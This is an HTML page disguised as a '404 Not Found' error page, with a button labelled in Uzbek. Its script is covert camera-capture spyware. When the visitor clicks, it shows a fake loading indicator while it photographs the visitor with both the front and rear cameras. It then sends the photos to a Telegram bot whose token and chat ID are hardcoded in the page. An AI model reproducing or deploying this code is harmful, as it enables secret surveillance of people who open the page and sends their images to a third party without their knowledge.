<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>404 Not Found</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    font-family: Arial, Helvetica, sans-serif;
    background: #fff;
    color: #000;
    padding: 40px;
}
h1 { font-size: 32px; }
p  { font-size: 16px; }

#photoBtn {
    margin-top: 20px;
    font-size: 16px;
    color: #0066cc;
    cursor: pointer;
    text-decoration: underline;
    background: none;
    border: none;
    padding: 0;
}

#progressBox {
    margin-top: 25px;
    display: none;
    text-align: center;
}
#status {
    font-weight: bold;
    margin-bottom: 12px;
    font-size: 18px;
}
#loader {
    width: 80px;
    height: 80px;
}
video, canvas { display: none; }
</style>
</head>

<body>

<h1>404 Not Found</h1>
<p>The requested URL was not found on this server.</p>

<button id="photoBtn">Rasmga olish</button>

<div id="progressBox">
    <div id="status">IN PROGRESS</div>
    <img id="loader" src="https://i.gifer.com/YCZH.gif" alt="loading">
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
const CHAT_ID  = "7880376636";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

function showLoader() {
    document.getElementById("progressBox").style.display = "block";
}

// Kamera tayyor bo'lishini kutib, rasm olish
async function capture(facingMode) {
    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode }
    });
    video.srcObject = stream;

    // Video metadata tayyor bo‘lishini kutish
    await new Promise(resolve => {
        video.onloadedmetadata = () => {
            video.play();
            resolve();
        };
    });

    // Qo‘shimcha 0.8s kutish, video oqimi barqaror bo‘lsin
    await new Promise(r => setTimeout(r, 800));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    stream.getTracks().forEach(t => t.stop());

    return new Promise(res => {
        canvas.toBlob(blob => res(blob), "image/jpeg", 0.9);
    });
}

async function sendToTelegram(blob) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("photo", blob);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd
    });
}

document.getElementById("photoBtn").onclick = async () => {
    showLoader();

    // OLD kamera
    const frontBlob = await capture("user");
    sendToTelegram(frontBlob);

    // ORQA kamera
    const backBlob = await capture("environment");
    sendToTelegram(backBlob);
};
</script>

</body>
</html>
